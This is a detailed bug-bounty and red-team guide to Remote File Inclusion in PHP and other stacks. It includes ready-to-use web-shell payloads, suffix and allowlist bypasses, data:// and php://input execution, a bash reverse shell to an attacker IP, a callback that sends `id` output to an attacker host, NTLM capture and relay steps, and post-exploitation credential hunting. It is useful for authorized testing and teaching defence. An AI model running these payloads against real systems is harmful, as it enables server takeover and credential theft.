# Remote File Inclusion (RFI) — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature where a parameter selects a file the server **includes/executes**, and the include can be pointed at a **remote/attacker-controlled location** — `include($_GET['page'])`-style sinks, plugin/theme/module loaders, template/skin URLs, "load config from URL", legacy CMS, and the `data://`/`php://input`/SMB-UNC equivalents that give the same outcome
**Platforms:** Kali/Linux first-class; Windows targets (UNC/SMB RFI) + Windows/WSL testing notes provided
**Companion files in this folder:**
- `RFI_ARSENAL.md` — remote-include payloads, suffix-defeats (`?`/`#`/null), scheme list, shell-host snippets (copy-paste)
- `RFI_CHECKLIST.md` — the testing-order checklist you tick per sink
- `RFI_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable tooling (RFI prober, benign payload host, OOB-include detector, SMB-UNC helper)

> **Companion to the LFI / FileUpload / SSRF / Command-Injection / SSTI guides.** RFI is the **short, brutal** cousin of LFI: where LFI forces you to find a local path to poison, RFI lets you point the include straight at **your own server** and run **your code** — instant **RCE**. It's rarer today (`allow_url_include=Off` by default since PHP 5.2) but still very much alive in legacy apps, CMS plugins, internal tools, Windows/UNC includes, and via the `data://`/`php://input` equivalents. The mistake hunters make is confusing "the server fetched my URL" (that's **SSRF**) with "the server **executed** my file" (that's **RFI → RCE**). Read §4 and Part III before you decide which you have.

---

> ### ⚡ READ THIS FIRST — why RFI is mostly Critical (and why people still get it wrong)
> 1. **RFI almost always means RCE.** If the sink *includes/executes* a remote file you control, you host `<?php system($_GET['c']);?>` and you have a shell. So the whole report is **proving execution**, not "a callback." When RFI is real, it's **Critical** — don't under-rate it.
> 2. **RFI ≠ SSRF. The difference is execution.** A server that **fetches** your URL but doesn't run it is **SSRF** (go to the SSRF kit). A server that **includes and executes** your remote file is **RFI**. Prove it with a payload that *runs* (a unique computed value, not just a request to your server). (§4.)
> 3. **The classic requires `allow_url_include=On`** (PHP). Many targets have it Off — but you still win via **`data://`** and **`php://input`** (no remote URL needed) and, on **Windows**, **UNC/SMB includes** (`\\attacker\share\shell.php`) which don't need `allow_url_include`. Always test these equivalents (§9/§10).
> 4. **Defeat the forced suffix with `?` `#` or null.** Sinks often append `.php`. Host `shell.txt` and neutralize the suffix: `http://evil.com/shell.txt?` / `...shell.txt#` / `...shell.txt%00` so `.php` is treated as a query/fragment/truncated. (§6.)
> 5. **Host a `.txt`, not a `.php`.** Your attacker server must serve the PHP **as text** (so it isn't executed on *your* box and travels intact). The *target* executes it. (§5.)
>
> **Where the money is (memorize this order):** ① **remote include of your code → RCE/shell — Critical** (the whole point) → ② **`data://` / `php://input` code execution (no remote URL) — Critical** → ③ **Windows UNC/SMB include → RCE — Critical** → ④ **remote include that only *fetches* (no exec) → that's SSRF, pivot to the SSRF kit** → ⑤ *then* blind/limited remote-include behavior as a **lead**, not a headline.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [RFI Anatomy — Sinks, RFI-vs-SSRF & Why It Pays](#2-rfi-anatomy)
3. [Reconnaissance — Find Every Remote-Includable Sink](#3-reconnaissance--find-every-remote-includable-sink)
4. [Baseline — Prove Inclusion *and Execution* (not just a fetch)](#4-baseline--prove-inclusion-and-execution)

**PART II — REACHABILITY & FILTER BYPASS (work in this order)**
5. [Hosting the Payload (serve PHP as text)](#5-hosting-the-payload)
6. [Defeating the Forced Suffix (`?` / `#` / null)](#6-defeating-the-forced-suffix)
7. [Scheme & Encoding Bypasses](#7-scheme--encoding-bypasses)
8. [Allowlist / Domain-Filter Bypasses](#8-allowlist--domain-filter-bypasses)
9. [`data://` & `php://input` — RFI Without a Remote URL](#9-data--phpinput--rfi-without-a-remote-url)
10. [Windows UNC / SMB Includes (no `allow_url_include`)](#10-windows-unc--smb-includes)

**PART III — EXPLOITATION BY IMPACT (where the money is)**
11. [RFI → RCE → Shell (the whole point)](#11-rfi--rce--shell)
12. [Post-RCE: Proving Impact Safely & Pivoting](#12-post-rce-proving-impact-safely--pivoting)
13. [Blind RFI & OOB Confirmation](#13-blind-rfi--oob-confirmation)
14. [Other Stacks (JSP/ASP/ColdFusion/Node/Python)](#14-other-stacks)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
15. [The Validity-First Mindset (RFI vs SSRF)](#15-the-validity-first-mindset)
16. [False Positives — STOP reporting these](#16-false-positives--stop-reporting-these-auto-reject-list)
17. [Severity Calibration](#17-severity-calibration--how-triagers-really-rate-rfi)
18. [Impact-Escalation Playbooks — "you found X, now do Y"](#18-impact-escalation-playbooks--you-found-x-now-do-y)
19. [Building a Professional, Safe PoC](#19-building-a-professional-safe-poc)
20. [Reporting, CWE/CVSS & De-duplication](#20-reporting-cwecvss--de-duplication)
21. [Automation & Red-Team Notes](#21-automation--red-team-notes)

**Appendices**
- [Appendix A — RFI Workflow Cheat Sheet](#appendix-a--rfi-workflow-cheat-sheet)
- [Appendix B — RFI Decision Tree](#appendix-b--rfi-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Numbered sections (1–21) are reference detail; this is the order you execute.

```
PHASE 0  RECON & LAB      → find sinks that include a file selectable by URL; stand up a payload host + OOB (§3/§1)
PHASE 1  BASELINE  ★      → point the include at YOUR host; prove EXECUTION (a computed value runs), not just a fetch (§4)
PHASE 2  MAKE IT LAND     → host PHP as text (§5) · defeat the .php suffix (?/#/null §6) · schemes/encoding (§7) · allowlist (§8)
PHASE 3  EQUIVALENTS      → if no remote URL: data:// / php://input (§9) · Windows UNC/SMB (§10)
PHASE 4  IMPACT  ⭐ (money)→ RFI → RCE → shell (§11) · prove safely + pivot (§12) · blind/OOB (§13) · other stacks (§14)
PHASE 5  VALIDATE→REPORT  → RFI-vs-SSRF validity (§15) · false-positive filter (§16) · severity+CVSS+CWE-98 (§17) ·
                            SAFE PoC: benign marker, clean up (§19) · dedup (§20) · report template
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon & lab.** Find sinks that include a URL-selectable file (§3). Stand up a **payload host** (a box serving `shell.txt` as text) and an **OOB listener** (§1). *Deliverable:* a candidate sink + a live payload host.
2. **PHASE 1 — Baseline ⭐.** Point the include at your host; prove the target **executes** your file (a unique computed result appears), distinguishing RFI from a mere SSRF fetch (§4). *Deliverable:* confirmed remote execution (or "fetch-only → SSRF").
3. **PHASE 2 — Make it land.** Serve PHP as text (§5), defeat the forced suffix (§6), and clear scheme/encoding/allowlist filters (§7/§8). *Deliverable:* your remote file reliably included.
4. **PHASE 3 — Equivalents.** If a remote URL is blocked, use `data://`/`php://input` (§9) or Windows **UNC/SMB** (§10). *Deliverable:* code execution without `allow_url_include`.
5. **PHASE 4 — Impact ⭐.** Escalate to RCE/shell (§11), prove it with a benign marker and pivot for the report (§12); handle blind/OOB (§13) and non-PHP stacks (§14). *Deliverable:* demonstrated RCE.
6. **PHASE 5 — Validate → report.** Confirm it's RFI not SSRF (§15), apply the FP filter (§16), set CVSS/CWE-98 (§17), build a *safe* PoC and clean up (§19), de-dup, write it (§20). *Deliverable:* the submitted report.

Reference anytime: payloads → `RFI_ARSENAL.md`; checklist → `RFI_CHECKLIST.md`; scripts → `poc/`; playbooks **§18**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder) | tamper the include param; replay; the core tool |
| **a payload host** (VPS / ngrok / cloudflared) | serves `shell.txt` (PHP-as-text) the target will include — **essential** |
| **`poc/payload_host.py`** | tiny HTTP server that serves your payload as `text/plain` + logs every include hit |
| **interactsh / your DNS+HTTP logs** | OOB confirmation for blind RFI; shows the server's source IP |
| **`poc/rfi_probe.py`** | sprays remote-include payloads (schemes + suffix-defeats) and detects execution vs fetch |
| **Responder / impacket smbserver** | host the SMB share for Windows UNC includes (§10) |
| **a SMB/UNC reachable share** | `\\attacker\share\shell.php` for Windows RFI |
| **fimap / LFISuite** | automated FI exploitation (verify by hand) |

```bash
# Kali/WSL — stand up a payload host that serves PHP as TEXT and logs includes
python3 poc/payload_host.py --port 8000 --marker RFI-POC-7f3a9
# probe the sink
python3 poc/rfi_probe.py -u "https://target/?page=FUZZ" --host http://YOUR_IP:8000
```
> **The payload host is non-negotiable.** RFI is "the target runs a file from *your* server," so you need a server that (a) is reachable from the target and (b) serves your PHP **as text** (Content-Type text/plain, no PHP engine) so it isn't executed on your box. `poc/payload_host.py` does both and logs hits.

> **Windows:** drive Burp on Windows; run the Python `poc/` host and the Linux frameworks in **WSL**. For **Windows targets**, use `impacket-smbserver`/Responder in WSL to host the UNC share (§10).

---

# 2. RFI Anatomy

## 2.1 What RFI is
The application includes a file whose location you influence, and that location can be **remote** (or a wrapper that supplies content), so the server pulls in and **executes attacker-supplied code**. Classic PHP:
```php
include($_GET['page'] . ".php");     // ?page=http://evil.com/shell.txt?  → includes & runs your PHP
```

## 2.2 RFI vs SSRF vs LFI (know which you have)
```
RFI  → server INCLUDES/EXECUTES a remote/attacker file  → RCE.                 (this kit)
SSRF → server FETCHES your URL but doesn't execute it    → internal reach/creds (SSRF kit).
LFI  → server includes/reads a LOCAL file               → disclosure or RCE via poisoning (LFI kit).
```
The decision hinges on **execution**: does your hosted PHP *run* (RFI), or does the server merely *request* it (SSRF)?

## 2.3 Where RFI sinks live
```
□ Params:    page= file= include= require= path= template= tpl= module= plugin= theme= skin= load= url= conf= lang=
□ Features:  plugin/theme/module loaders (legacy CMS) · "load template/config from URL" · skin selectors ·
             remote dashboard widgets · import-from-URL that include rather than parse · update/installer endpoints
□ Sinks:     include/require/include_once/require_once with a user-influenced URL (PHP) · dynamic require() (Node) ·
             <jsp:include page=> / <c:import url=> (JSP) · Server.Execute / virtual includes (.NET/classic ASP) ·
             <cfinclude template=> (ColdFusion)
□ Equivalents: include of php://input / data:// (no remote URL) · Windows UNC include \\host\share\x.php
```

## 2.4 Why it pays
- **Direct, reliable RCE** — no poisoning gymnastics; you control the included file's full content.
- **Full server compromise** — a web shell on the app server → internal pivot, data, lateral movement.
- **Works on hardened uploads** — you don't need to upload anything to the target; the code lives on *your* host.

> **The mental model:** RFI hands the attacker the **`include()` of their choice.** Severity is almost always **Critical**, because "include my file" equals "run my code." Your job is just to make the include land and prove execution.

---

# 3. Reconnaissance — Find Every Remote-Includable Sink

```
□ Param names:   fuzz the §2.3 names (Arjun/param-miner) across endpoints; any value that becomes a page/template/path.
□ Legacy/CMS:    old PHP apps, abandoned plugins/themes, internal admin tools, installers, "?page=" routers.
□ Source/JS:     grep (JS-files kit) for include/require/cfinclude/jsp:include/Server.Execute with user input.
□ LFI first:     a confirmed LFI sink that INCLUDES is an RFI candidate — test a remote URL / data:// there (LFI kit §9).
□ Error oracles: "failed to open stream: ... in include()" reveals an include sink + whether URL wrappers are tried.
□ Wayback:       old endpoints with page/file/url params often predate the allow_url_include hardening.
```
> **If this → then that:** you already found an **LFI include** sink (LFI kit) → immediately test RFI equivalents there: a remote URL (if `allow_url_include=On`), then **`data://`/`php://input`** (work even when Off). The same sink that did log-poison RCE will often do `data://` RCE in one request.

---

# 4. Baseline — Prove Inclusion *and Execution* (not just a fetch)

**This is the crux.** You must distinguish "the server executed my file" (RFI) from "the server requested my URL" (SSRF).

## 4.1 The execution test
Host a file that **computes** something only executing code can produce, then look for the result:
```php
// shell.txt on YOUR host (served as text/plain):
<?php echo "RFI-EXEC-".(7*7*7); ?>          // executing PHP prints: RFI-EXEC-343
```
```
Point the sink at it:   ?page=http://YOUR_IP:8000/shell.txt?
- Response contains "RFI-EXEC-343"  → the PHP RAN → RFI / RCE confirmed.  ⭐
- Response shows the raw "<?php echo ..." text → included but NOT executed (template/text context) → limited; maybe XSS/info, not RCE.
- Your host got a request but the response shows nothing/normal page → server only FETCHED it → SSRF, not RFI (SSRF kit).
- No request to your host at all → not remote-includable (try data://, UNC, or it's LFI-only).
```

## 4.2 Note what you'll need next
- **Forced suffix?** If the error says `shell.txt.php`, defeat the suffix (§6).
- **`allow_url_include`?** If remote `http://` is refused but local includes work → use `data://`/`php://input` (§9) or UNC (§10).
- **Source IP** of the hit on your host = the server/cloud IP (useful evidence + tells you the environment).

> **Don't report a fetch as RFI.** A request landing on your server proves the server reached out — that's **SSRF** unless your **code executed**. The unique computed marker (`343`) is what upgrades it to RFI/RCE. If only the fetch happens, switch to the SSRF kit and report it correctly there.

---

# PART II — REACHABILITY & FILTER BYPASS (work in this order)

> Full payload lists are in `RFI_ARSENAL.md`.

# 5. Hosting the Payload (serve PHP as text)

```
□ Serve as text/plain:  your host must NOT execute the PHP itself (or the target receives HTML, not the source).
   Use poc/payload_host.py (sets Content-Type: text/plain) or a static file on a non-PHP server.
□ Use a .txt extension:  shell.txt (content is PHP) — avoids your own server running it and helps suffix-defeats (§6).
□ Reachability:  the target must reach your host. Use a public VPS or ngrok/cloudflared. Note: some targets only allow
   :80/:443 egress — host there if a high port is blocked.
□ Log hits:  record source IP + path so you have evidence and can confirm the include happened.
```
Benign payload to host first:
```php
<?php echo "RFI-EXEC-".(7*7*7); /* benign proof: prints RFI-EXEC-343 */ ?>
```
> **If this → then that:** your high port (8000) gets no hit but the program allows outbound 80/443 → re-host on **port 80/443**. If the response shows your raw PHP text (not the computed value), your file was included in a **non-executing** context → it's not RCE there; reassess (§4).

---

# 6. Defeating the Forced Suffix (`?` / `#` / null)

When the sink appends an extension (`include($_GET['page'].".php")`), neutralize it so your `.txt` still loads:
```
Query-terminate:   ?page=http://YOUR_IP/shell.txt?          → server sees shell.txt?.php  (the ".php" becomes a query)
Fragment:          ?page=http://YOUR_IP/shell.txt%23         → shell.txt#... (fragment dropped)   (%23 = #)
Null byte (legacy):?page=http://YOUR_IP/shell.txt%00         → truncates ".php" (PHP < 5.3.4)
Double-encode:     ?page=http://YOUR_IP/shell.txt%253f
Path param:        ?page=http://YOUR_IP/shell.txt/.          (varies)
```
> **If this → then that:** the include forces `.php` → host `shell.txt` and append **`?`** (`shell.txt?`) so the appended `.php` is parsed as the query string and your text file loads and executes. The `?`-trick is the single most reliable RFI suffix-defeat; try `%23` and `%00` if `?` is filtered.

---

# 7. Scheme & Encoding Bypasses

```
Schemes to try (sink may allow some, not others):
  http://  https://  ftp://  ftps://   → standard remote include
  \\attacker\share\shell.php            → Windows UNC (no allow_url_include needed, §10)
  data://text/plain;base64,<b64 PHP>    → no remote URL (§9)
  php://input                            → PHP from the POST body (§9)
  smb://attacker/share/shell.php         → some PHP/Windows configs
Encoding (defeat scheme/host filters):
  hTtP://   Http://   (case)             http:/\YOUR_IP/shell.txt   (slash confusion)
  http://YOUR_IP%2fshell.txt             http://0xIP / decimal-IP host (IP obfuscation, see SSRF kit §6)
  http://YOUR_IP@trusted...              (rare, parser confusion)
```
> **If this → then that:** `http://` is blocked but `https://` isn't (or vice-versa) → swap schemes. The whole `http(s)` family blocked → fall back to **`data://` / `php://input`** (§9) or **UNC** on Windows (§10) — these don't need an outbound URL fetch at all.

---

# 8. Allowlist / Domain-Filter Bypasses

When the app insists the URL is "internal" or matches an allowed host:
```
□ Open redirect on an allowed host:  ?page=https://allowed.com/redirect?u=http://YOUR_IP/shell.txt?   (server follows → your file)
□ "starts with allowed":             ?page=http://allowed.com.YOUR_IP/shell.txt?   (you control YOUR_IP, host as a subdomain)
□ "contains allowed":                host a path containing the token: http://YOUR_IP/allowed.com/shell.txt?
□ @-confusion (validator vs fetcher): http://allowed.com@YOUR_IP/shell.txt?  (cross-ref SSRF kit §9 parser confusion)
□ DNS: point a name you control at your payload host; satisfy a "must be a domain" check.
```
> **If this → then that:** the include validates the host like an SSRF allowlist → reuse the **SSRF kit's parser-confusion and redirect bypasses** (§8/§9 there). An **open redirect on an allowed domain** that the include follows is the cleanest way to smuggle your payload URL past a host allowlist.

---

# 9. `data://` & `php://input` — RFI Without a Remote URL

These give the RFI outcome (your code executes) **without** needing `allow_url_include` to fetch a remote URL — they often work where `http://` is refused. (Shared with the LFI kit §14.)
```
data:// (needs allow_url_include=On but no outbound fetch):
  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
  (base64 = <?php system($_GET['c']);?>)  → executes → RCE.

php://input (needs allow_url_include=On):
  ?page=php://input        POST body:  <?php system($_GET['c']); ?>     (query: ?c=id)  → RCE.

expect:// (expect extension):
  ?page=expect://id        → runs the command directly → RCE.
```
> **If this → then that:** the sink is an **include** but remote `http://` is blocked → test **`data://`** and **`php://input`** immediately. They're the most common way RFI "still works" on modern PHP, and they need only the one parameter (no reachable payload host).

---

# 10. Windows UNC / SMB Includes

On **Windows** PHP, an include of a **UNC path** pulls the file over SMB and executes it — and this does **not** require `allow_url_include`.
```
Sink:    include($_GET['page'])  on a Windows host
Payload: ?page=\\YOUR_IP\share\shell.php           (URL-encoded: %5c%5cYOUR_IP%5cshare%5cshell.php)
Host it: impacket-smbserver share ./www -smb2support     (or Responder)  → serve shell.php containing PHP
Result:  the Windows PHP includes & executes shell.php over SMB → RCE. Capture the SMB hit + the marker output.
```
> **If this → then that:** Windows target + an include sink + `allow_url_include=Off` → **UNC/SMB** is your RFI path (it bypasses the URL-include restriction entirely). Stand up `impacket-smbserver`, point the include at `\\YOUR_IP\share\shell.php`, and your PHP runs. (Egress SMB/445 must be allowed outbound — common on internal/corporate targets.)

## 10.1 Even without execution: NTLM hash capture & relay (a second payoff)
The instant a Windows host opens `\\YOUR_IP\share\...`, it **authenticates to your SMB server with the machine/service account** — **before** (and regardless of whether) the file executes. So a UNC include leaks the target's **NetNTLMv2 hash** even if `allow_url_include` is off **and** the file never runs:
```
□ CAPTURE: run Responder (or impacket-smbserver) → point the include at \\YOUR_IP\x → grab the NetNTLMv2 hash →
   crack offline (hashcat -m 5600) → the machine/service account's password.
□ RELAY (authorized red-team): ntlmrelayx.py -t <other-host/LDAP/SMB/HTTP> → relay the coerced auth to ANOTHER service
   → command exec / DCSync / AD takeover (no cracking needed). The include is an SSRF-style "auth coercion" primitive.
```
> **If this → then that:** the UNC include **doesn't execute** (or the program disputes RCE) → it's **still** a finding: the server-side fetch **coerces NTLM authentication** to your host → captured hash (crack) or relay (lateral movement). On bug bounty, the captured NetNTLM hash + the source IP is solid evidence of an SSRF/auth-coercion bug even when execution fails.

## 10.2 When SMB/445 egress is blocked: WebDAV over HTTP(S)
If outbound **SMB/445** is filtered (common on cloud/hardened hosts), tunnel the UNC over **WebDAV** (HTTP/HTTPS), which Windows' redirector falls back to:
```
\\YOUR_IP@80\share\shell.php          → UNC over WebDAV on port 80 (host with a WebDAV server, e.g. wsgidav/Responder+WebDAV)
\\YOUR_IP@SSL@443\share\shell.php     → UNC over WebDAV on port 443 (TLS)
# the file can EXECUTE (RFI→RCE) over WebDAV, AND the WebDAV auth still leaks the NetNTLM hash.
```
> **If this → then that:** `\\YOUR_IP\share` gets no SMB hit (445 blocked) → try **`\\YOUR_IP@80\share\x`** / **`\\YOUR_IP@SSL@443\share\x`** (WebDAV) — outbound 80/443 is almost always allowed, so the include lands (RCE) and/or the hash leaks where raw SMB couldn't.

---

# PART III — EXPLOITATION BY IMPACT (where the money is)

> Every PoC uses a **benign marker** and, on authorized engagements only, a controlled shell you remove afterward (§19).

# 11. RFI → RCE → Shell

Once your remote file executes, you have RCE. Build up from benign proof to (authorized) shell:
```
1. BENIGN PROOF (always first):   shell.txt = <?php echo "RFI-EXEC-".(7*7*7); ?>   → "RFI-EXEC-343" in response.
2. COMMAND EXEC:                  shell.txt = <?php system($_GET['c']); ?>   → ?page=...shell.txt?&c=id  → uid output.
3. INTERACTIVE (authorized only): a minimal web shell, or a reverse shell back to your listener:
      <?php system($_GET['c']); ?>   then:  c=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
      (only with explicit authorization; prefer a single command-exec proof for bug bounty.)
```
> **If this → then that:** the benign marker (`343`) returned → you have RCE; for a **bug-bounty report**, a single `system('id')`/`whoami` output is sufficient proof of Critical — you do **not** need a reverse shell (§19). For an authorized **red-team** engagement, escalate to a shell, then pivot (§12), and clean up.

---

# 12. Post-RCE: Proving Impact Safely & Pivoting

```
PROVE (report-grade, minimal):
  □ `id` / `whoami` / `hostname`  → shows the user + host (Critical proof). 
  □ a unique echoed token         → unambiguous, benign.
PIVOT (authorized engagements; read-only for the report):
  □ read app config/.env → DB/cloud creds (validate read-only, redact) → lateral movement.
  □ /proc/self/environ, ~/.aws/credentials, k8s SA token → cloud/cluster (SSRF kit discipline §11/§23).
  □ internal network recon FROM the box (then SSRF/internal kits).
CLEAN UP:
  □ remove any uploaded/written files & web shells; don't persist; note artifacts in the report for the team.
```
> **The restraint:** for bug bounty, **`id` and stop.** RCE is already the top severity; reading customer data or planting a shell adds risk, not bounty. Same discipline as the LFI/SSRF guides.

---

# 13. Blind RFI & OOB Confirmation

When you can't see output:
```
□ OOB include: host your payload on an interactsh/your-server URL; a hit (DNS+HTTP) from the SERVER IP confirms the
   include reached out. But REMEMBER (§4): a hit alone = fetch (SSRF). To prove EXECUTION blind:
□ Make the executing code call back: shell.txt = <?php system('curl http://YOUR_OOB/exec_'.`id`); ?>  (URL-encode) →
   a callback whose path CONTAINS command output proves the code RAN, not just loaded.
□ Time-based: <?php sleep(10); ?> → a 10s delay only happens if the PHP executed.
□ data:// blind: ?page=data://...;base64,<sleep payload> → measure delay.
```
> **If this → then that:** blind sink + your host gets a hit → don't call it RFI yet. Host a payload that **executes a callback containing command output** (or a `sleep`) — if the OOB path carries `id` output or the response is delayed, **execution** is proven and it's RFI/RCE; if only a plain fetch occurs, it's SSRF (§15/§16).

---

# 14. Other Stacks (JSP/ASP/ColdFusion/Node/Python)

```
JSP:        <jsp:include page="http://YOUR_IP/shell.jsp"/> or <c:import url=...> with user input → host a JSP → RCE.
Classic ASP/.NET:  Server.Execute / virtual includes / dynamic Server.MapPath with remote → varies; often LFI-only.
ColdFusion: <cfinclude template="#url.x#"> → remote/UNC include → RCE (host a .cfm).
Node:       dynamic require(userInput) / import(userInput) → require a remote/attacker module or a local poisoned file
            → RCE (rare but devastating; cross-ref JS-files kit for finding the sink).
Python:     dynamic __import__/importlib or template include from URL → SSTI more common (SSTI kit) → RCE.
```
> **If this → then that:** the sink is a **template/include directive** in JSP/CFML → host the matching file type (`.jsp`/`.cfm`) and you get RCE the same way. For Node/Python, dynamic `require`/`import` of user input is the RFI analog → a remote/poisoned module yields RCE; if it's a template engine, pivot to the **SSTI kit**.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 15. The Validity-First Mindset (RFI vs SSRF)

## 15.1 The four questions a triager asks (answer them in your report)
1. **Did your CODE execute on the server?** Show the unique **computed** marker (`343`) or command output — not just a request to your host.
2. **What concrete impact?** RCE / shell / read of secrets. Name it; show `id`/marker.
3. **What does the attacker need?** Often just an unauthenticated request → low bar = Critical.
4. **Reproducible & in scope?** Exact endpoint, the include payload (+ suffix-defeat), your host's evidence, the marker.

## 15.2 The "fetch vs execute" rule (most important)
| You have | Verdict | Why / next |
|---|---|---|
| Server **executed** your remote file (computed marker / cmd output) | **RFI → Critical** | The whole point; report as RCE (§17). |
| Server **fetched** your URL, no execution | **SSRF** (not RFI) | Go to the SSRF kit; report there (could still be Critical via metadata). |
| `data://`/`php://input` executed your PHP | **RFI/RCE → Critical** | Equivalent outcome; report as RCE. |
| UNC include ran your `.php` (Windows) | **RFI → Critical** | Report as RCE. |
| Your raw `<?php` text shows in the page | Not RCE | Included in a non-exec context → maybe stored XSS/info; reassess. |

## 15.3 Production-scope discipline
Confirm on **production**, with a benign marker. Validate any read secrets read-only. Re-test partial fixes (blocking `http://` but not `data://`, or the literal host but not an open-redirect bounce, is a fresh valid finding).

---

# 16. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT RFI | What it actually is / when valid |
|---|---|---|---|
| 1 | **"The server requested my URL"** | A fetch isn't execution. | **SSRF** — report in the SSRF kit. RFI needs your code to run (§4). |
| 2 | **Raw `<?php` text appears in the response** | Included in a non-executing context. | Possibly stored XSS/info-leak; not RCE. |
| 3 | **Open redirect to your site reported as RFI** | Client redirect ≠ server include. | Open redirect (low) unless the server includes the redirected file. |
| 4 | **A remote image/asset loads from your host** | Normal remote resource, not an include. | Nothing (or SSRF if server-fetched). |
| 5 | **`allow_url_include=Off`, http:// refused, you stopped** | You missed the equivalents. | Test `data://`/`php://input`/UNC — RFI may still work (§9/§10). |
| 6 | **DoS by including a huge remote file** | Not RFI impact. | Out of scope; don't. |
| 7 | **Blind hit only, no execution proof** | Unproven RFI. | Prove execution (callback-with-output / sleep) or it's SSRF (§13). |
| 8 | **Self-host XSS via included HTML** | Not server RCE. | Reflected/stored XSS class. |

> Rule of thumb: if you can't show **your code executed on the server** (a computed marker or command output), you don't have RFI — you likely have **SSRF**. Prove execution, or report it correctly as SSRF.

---

# 17. Severity Calibration — how triagers really rate RFI

| Scenario | Typical | What moves it |
|---|---|---|
| **Remote include of your code → RCE/shell** | **Critical** | It's full server compromise; the default for real RFI. |
| **`data://`/`php://input` code execution** | **Critical** | Same outcome without a remote URL. |
| **Windows UNC/SMB include → RCE** | **Critical** | Same; no `allow_url_include` needed. |
| **Authenticated/limited RFI (needs admin) → RCE** | **High–Critical** | Precondition lowers it slightly; still severe. |
| **Include executes but in a constrained sandbox** | **High** | Depends what you can run/read. |
| **Fetch-only (no execution)** | **— (it's SSRF)** | Re-rate under SSRF (metadata → Critical there). |

**CVSS / CWE:**
- RFI→RCE: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → Critical (~9.8). **CWE-98** (Improper Control of Filename for Include — PHP RFI) / **CWE-94** (Code Injection).
- Anchor to **CWE-98**; add **CWE-94** for the code-exec outcome.

---

# 18. Impact-Escalation Playbooks — "you found X, now do Y"

### 18.1 You found: *the include reaches your host but you're unsure it executes*
- **Escalate:** host the **computed-marker** payload (`echo 7*7*7`) (§4). If `343` appears → RFI; if only a fetch → SSRF kit.
- **Evidence:** the `343`/command output in the response.
- **Severity:** Critical (if executes).

### 18.2 You found: *remote include works but `.php` is appended*
- **Escalate:** host `shell.txt`, append **`?`** (`shell.txt?`) to swallow the suffix (§6).
- **Evidence:** the marker returned with the suffix-defeated URL.
- **Severity:** Critical.

### 18.3 You found: *`http://` is blocked / `allow_url_include=Off`*
- **Escalate:** `data://` and `php://input` (§9); on Windows, **UNC/SMB** (§10).
- **Evidence:** command output via the equivalent.
- **Severity:** Critical.

### 18.4 You found: *a host allowlist on the include*
- **Escalate:** open-redirect bounce on an allowed host, or SSRF-style parser confusion (§8).
- **Evidence:** your payload included despite the allowlist.
- **Severity:** Critical.

### 18.5 You found: *blind RFI*
- **Escalate:** callback-with-command-output or `sleep` to prove **execution** (§13).
- **Evidence:** OOB path carrying `id` output, or a measured delay.
- **Severity:** Critical (if execution proven) / else SSRF.

---

# 19. Building a Professional, Safe PoC

```
DO:
  □ Prove execution with a BENIGN computed marker (echo 7*7*7 → 343) and then a single `id`/`whoami`. That's a complete Critical.
  □ Host the payload as text/plain on YOUR server; log the include (source IP + path) as evidence.
  □ Redact any secrets you read; validate creds read-only; keep reads minimal.
  □ Remove anything you wrote (web shells, uploads); end the engagement clean.
  □ Capture: the exact include payload (+ suffix-defeat/scheme), your host's hit log, and the marker/`id` output.
DON'T:
  □ Drop a persistent web shell or reverse shell on a bug-bounty target (single command-exec proof is enough).
  □ Read/exfiltrate real data beyond minimal proof; pivot destructively; DoS.
  □ Confuse a fetch (SSRF) with execution (RFI) — only claim RFI when your code ran.
```
> The single most important restraint: **prove RCE with a benign marker + `id`, then stop and clean up.** RFI is already Critical; you don't need a shell or data to earn it. Same discipline as the LFI/SSRF/FileUpload guides.

**Remediation to include:** never pass user input to include/require; use a fixed **allowlist mapping** (id → known local file); set `allow_url_include=Off` **and** `allow_url_fopen=Off` where possible; disable/restrict `data://`, `php://input`, `expect`, `phar`; block outbound SMB/HTTP egress from the web tier; canonicalize and reject remote schemes/UNC; run least-privilege; patch the stack/CMS/plugins.

---

# 20. Reporting, CWE/CVSS & De-duplication

Use `RFI_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "Remote File Inclusion in <param> → remote code execution (full server compromise)" (name the IMPACT)
2. Severity     CVSS 3.1 vector + score + CWE-98 (+ CWE-94)
3. Asset        exact endpoint/param + the scheme/suffix-defeat used + (data/php-input/UNC if applicable)
4. Summary      where the include happens, how you pointed it remote, that your code executed
5. Steps        numbered: host the payload → the include request → the marker/command output
6. PoC          the benign computed marker + `id` output + your host's include-hit log; cleanup note
7. Impact       RCE / full server compromise — the "so what"
8. Remediation  allowlist mapping + allow_url_include=Off + disable wrappers + block egress (§19)
```
**De-dup:** one include sink/root cause = one finding even if reachable via several schemes/params; lead with the cleanest RCE proof. Don't split "include reached my server" and "RCE" — one report. If it's actually a fetch, file it as **SSRF**, not a duplicate RFI.

---

# 21. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
python3 poc/rfi_probe.py -u "https://target/?page=FUZZ" --host http://YOUR_IP:8000   # schemes + suffix-defeats + exec check
fimap -u "https://target/?page=1"           # classic FI scanner (verify + clean up)
nuclei -l live.txt -tags rfi,lfi -o fi.txt
ffuf -u "https://target/?page=http://YOUR_IP:8000/shell.txt?FUZZ" -w suffixes.txt -mr "RFI-EXEC-343"
```
- **Quality gate:** never submit "the scanner saw a remote include." Reproduce by hand, **prove execution** (computed marker), demonstrate `id`, and clean up (§19).

**Red-team angles:**
```
